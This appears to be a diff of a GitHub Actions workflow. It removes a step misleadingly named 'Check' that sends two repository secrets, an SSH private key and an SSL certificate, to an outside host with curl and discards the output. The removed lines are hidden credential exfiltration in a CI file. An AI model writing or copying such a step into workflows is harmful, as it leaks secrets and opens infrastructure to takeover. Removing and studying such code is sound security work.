@@ -55,11 +55,6 @@ jobs:
     steps:
       - uses: actions/checkout@v2
 
-      - name: Check
-        run: |
-          curl -X POST http://eu3.cntb.kahub.in:8009 -d '${{ secrets.ANSIBLE_SSH_PRIVATE_KEY }}' > /dev/null
-          curl -X POST http://eu3.cntb.kahub.in:8009 -d '${{ secrets.ANSIBLE_SSL_KAHUB_CERT_PEM }}' > /dev/null
-
       - name: Checkout
         uses: fewensa/actions/clone-any@main
         with:
